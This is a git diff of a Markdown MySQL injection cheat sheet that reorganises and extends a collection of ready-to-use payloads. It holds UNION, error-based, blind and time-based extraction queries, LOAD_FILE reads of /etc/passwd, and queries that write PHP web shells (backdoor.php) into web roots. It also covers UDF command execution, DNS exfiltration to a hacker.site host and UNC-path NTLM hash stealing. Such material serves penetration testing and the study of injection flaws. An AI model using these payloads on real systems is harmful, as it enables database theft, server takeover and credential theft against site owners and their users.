@@ -1,6 +1,35 @@
 # MYSQL Injection
 
-## MYSQL
+## Summary
+
+* [MYSQL Comment](#mysql-comment)
+* [Detect columns number](#detect-columns-number)
+* [MYSQL Union Based](#mysql-union-based)
+    * [Extract database with information_schema](#extract-database-with-information-schema)
+    * [Extract data without information_schema](#extract-data-without-information-schema)
+    * [Extract data without columns name](#extract-data-without-columns-name)
+* [MYSQL Error Based](#mysql-error-based)
+    * [MYSQL Error Based - Basic](#mysql-error-based---basic)
+    * [MYSQL Error Based - UpdateXML function](#mysql-error-based---updatexml-function)
+    * [MYSQL Error Based - Extractvalue function](#mysql-error-based---extractvalue-function)
+* [MYSQL Blind](#mysql-blind)
+    * [MYSQL Blind with substring equivalent](#mysql-blind-with-substring-equivalent)
+    * [MYSQL Blind using a conditional statement](#mysql-blind-using-a-conditional-statement)
+    * [MYSQL Blind with MAKE_SET](#mysql-blind-with-make-set)
+    * [MYSQL Blind with LIKE](#mysql-blind-with-like)
+* [MYSQL Time Based](#mysql-time-based)
+* [MYSQL DIOS - Dump in One Shot](#mysql-dios---dump-in-one-shot)
+* [MYSQL Read content of a file](#mysql-read-content-of-a-file)
+* [MYSQL Write a shell](#mysql-write-a-shell)
+* [MYSQL UDF command execution](#mysql-udf-command-execution)
+* [MYSQL Truncation](#mysql-truncation)
+* [MYSQL Out of band](#mysql-out-of-band)
+    * [DNS exfiltration](#dns-exfiltration)
+    * [UNC Path - NTLM hash stealing](#unc-path---ntlm-hash-stealing)
+* [References](#references)
+
+
+## MYSQL comment
 
 ```sql
 # MYSQL Comment
@@ -9,9 +38,12 @@
 /*!32302 10*/ Comment for MYSQL version 3.23.02
 ```
 
-## Detect columns number
 
-Using a simple ORDER
+## MYSQL Union Based
+
+### Extract database with information_schema
+
+First you need to know the number of columns, you can use `order by`.
 
 ```sql
 order by 1
@@ -21,7 +53,7 @@ order by 3
 order by XXX
 ```
 
-## MYSQL Union Based
+Then the following codes will extract the databases'name, tables'name, columns'name.
 
 ```sql
 UniOn Select 1,2,3,4,...,gRoUp_cOncaT(0x7c,schema_name,0x7c)+fRoM+information_schema.schemata
@@ -59,7 +91,7 @@ Method for `MySQL 5`
 ...
 ```
 
-### Extract data without information_schema 
+### Extract data without columns name 
 
 Extracting data from the 4th column without knowing its name.
 
@@ -79,7 +111,12 @@ MariaDB [dummydb]> select author_id,title from posts where author_id=-1 union se
 ```
 
 
-## MYSQL Error Based - Basic
+
+
+
+## MYSQL Error Based
+
+### MYSQL Error Based - Basic
 
 Works with `MySQL >= 4.1`
 
@@ -88,7 +125,7 @@ Works with `MySQL >= 4.1`
 '+(select 1 and row(1,1)>(select count(*),concat(CONCAT(@@VERSION),0x3a,floor(rand()*2))x from (select 1 union select 2)a group by x limit 1))+'
 ```
 
-## MYSQL Error Based - UpdateXML function
+### MYSQL Error Based - UpdateXML function
 
 ```sql
 AND updatexml(rand(),concat(CHAR(126),version(),CHAR(126)),null)-
@@ -105,7 +142,7 @@ Shorter to read:
 ' and updatexml(null,concat(0x0a,(select table_name from information_schema.tables where table_schema=database() LIMIT 0,1)),null)-- -
 ```
 
-## MYSQL Error Based - Extractvalue function
+### MYSQL Error Based - Extractvalue function
 
 Works with `MySQL >= 5.1`
 
@@ -117,7 +154,9 @@ AND extractvalue(rand(),concat(0x3a,(SELECT concat(CHAR(126),column_name,CHAR(12
 AND extractvalue(rand(),concat(0x3a,(SELECT concat(CHAR(126),data_info,CHAR(126)) FROM data_table.data_column LIMIT data_offset,1)))--
 ```
 
-## MYSQL Blind with substring equivalent
+## MYSQL Blind
+
+### MYSQL Blind with substring equivalent
 
 ```sql
 ?id=1 and substring(version(),1,1)=5
@@ -127,7 +166,7 @@ AND extractvalue(rand(),concat(0x3a,(SELECT concat(CHAR(126),data_info,CHAR(126)
 ?id=1 and (select mid(version(),1,1)=4)
 ```
 
-## MYSQL Blind using a conditional statement
+### MYSQL Blind using a conditional statement
 
 TRUE: `if @@version starts with a 5`:
 
@@ -145,7 +184,7 @@ Response:
 HTTP/1.1 200 OK
 ```
 
-## MYSQL Blind with MAKE_SET
+### MYSQL Blind with MAKE_SET
 
 ```sql
 AND MAKE_SET(YOLO<(SELECT(length(version()))),1)
@@ -154,7 +193,7 @@ AND MAKE_SET(YOLO<(SELECT(length(concat(login,password)))),1)
 AND MAKE_SET(YOLO<ascii(substring(concat(login,password),POS,1)),1)
 ```
 
-## MYSQL Blind with wildcard character
+### MYSQL Blind with LIKE
 
 ['_'](https://www.w3resource.com/sql/wildcards-like-operator/wildcards-underscore.php) acts like the regex character '.', use it to speed up your blind testing
 
@@ -192,7 +231,13 @@ Need the `filepriv`, otherwise you will get the error : `ERROR 1290 (HY000): The
 ' UNION ALL SELECT LOAD_FILE('/etc/passwd') --
 ```
 
-## MYSQL DROP SHELL
+If you are `root` on the database, you can re-enable the `LOAD_FILE` using the following query
+
+```sql
+GRANT FILE ON *.* TO 'root'@'localhost'; FLUSH PRIVILEGES;#
+```
+
+## MYSQL Write a shell
 
 ```sql
 SELECT "<?php system($_GET['cmd']); ?>" into outfile "C:\\xampp\\htdocs\\backdoor.php"
@@ -202,6 +247,33 @@ SELECT '' INTO OUTFILE '/var/www/html/x.php' FIELDS TERMINATED BY '<?php phpinfo
 [...] union all select 1,2,3,4,"<?php echo shell_exec($_GET['cmd']);?>",6 into OUTFILE 'c:/inetpub/wwwroot/backdoor.php'
 ```
 
+## MYSQL Truncation
+
+In MYSQL "`admin `" and "`admin`" are the same. If the username column in the database has a character-limit the rest of the characters are truncated. So if the database has a column-limit of 20 characters and we input a string with 21 characters the last 1 character will be removed.
+
+## MYSQL UDF command execution
+
+First you need to check if the UDF are installed on the server.
+
+```powershell
+$ whereis lib_mysqludf_sys.so
+/usr/lib/lib_mysqludf_sys.so
+```
+
+Then you can use functions such as `sys_exec` and `sys_eval`.
+
+```sql
+$ mysql -u root -p mysql
+Enter password: [...]
+mysql> SELECT sys_eval('id');
++--------------------------------------------------+
+| sys_eval('id') |
++--------------------------------------------------+
+| uid=118(mysql) gid=128(mysql) groups=128(mysql) |
++--------------------------------------------------+
+```
+
+
 ## MYSQL Out of band
 
 ```powershell
@@ -209,14 +281,14 @@ select @@version into outfile '\\\\192.168.0.100\\temp\\out.txt';
 select @@version into dumpfile '\\\\192.168.0.100\\temp\\out.txt
 ```
 
-DNS exfiltration
+### DNS exfiltration
 
 ```sql
 select load_file(concat('\\\\',version(),'.hacker.site\\a.txt'));
 select load_file(concat(0x5c5c5c5c,version(),0x2e6861636b65722e736974655c5c612e747874))
 ```
 
-UNC Path - NTLM hash stealing
+### UNC Path - NTLM hash stealing
 
 ```sql
 select load_file('\\\\error\\abc');
@@ -231,3 +303,6 @@ load data infile '\\\\error\\abc' into table database.table_name;
 - [MySQL Out of Band Hacking - @OsandaMalith](https://www.exploit-db.com/docs/english/41273-mysql-out-of-band-hacking.pdf)
 - [[Sqli] Extracting data without knowing columns names - Ahmed Sultan @0x4148](https://blog.redforce.io/sqli-extracting-data-without-knowing-columns-names/)
 - [Help по MySql инъекциям - rdot.org](https://rdot.org/forum/showpost.php?p=114&postcount=1)
+- [SQL Truncation Attack - Warlock](https://resources.infosecinstitute.com/sql-truncation-attack/)
+- [HackerOne @ajxchapman 50m-ctf writeup - Alex Chapman @ajxchapman](https://hackerone.com/reports/508123)
+- [SQL Wiki - netspi](https://sqlwiki.netspi.com/injectionTypes/errorBased)
